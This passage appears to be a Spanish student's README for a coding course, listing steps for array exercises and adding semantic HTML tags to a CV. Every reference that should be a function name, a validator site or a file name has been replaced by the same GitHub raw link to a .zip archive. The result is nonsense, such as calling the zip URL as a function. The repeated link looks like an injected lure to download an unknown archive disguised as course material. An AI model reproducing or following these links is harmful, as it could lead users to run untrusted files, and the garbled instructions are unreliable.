...
4) Mando a imprimir en pantalla `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-2/main/student-cvs/aa2d-7694/semana_v1.9.zip(idObjeto(obj)` para que muestre el resultado.
...
3) Por ello me di la tarea de buscar en google un poco sobre los arrays y encontre que para demostrar si un array es true o false habia que mandar a llamar a `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-2/main/student-cvs/aa2d-7694/semana_v1.9.zip()`
4) Sustitui `https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-2/main/student-cvs/aa2d-7694/semana_v1.9.zip()` por `typeof` y mande a llamar a mi funcion en pantalla.

### Ejercicio de calentamiento - Ejercicio 03:

1) Verifique el Outline de mi HTML haciendo un _Copy & Paste_ en [https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-2/main/student-cvs/aa2d-7694/semana_v1.9.zip](url) 
2) Realice las correcciones que me indico y valide que todo tuviera sentido semantico
3) Agregue las etiquetas semanticas vistas en clase en los apartados de mi hoja de vida _(https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-2/main/student-cvs/aa2d-7694/semana_v1.9.zip)_ tal como `header`, `article`, `section` y `footer`
4) Hice fork del repositorio de semana-2 de Undefined Academy
5) Clone el fork en mi carpeta local y añadi mi https://raw.githubusercontent.com/EdwinOrtizCantillo/semana-2/main/student-cvs/aa2d-7694/semana_v1.9.zip en repositorio local
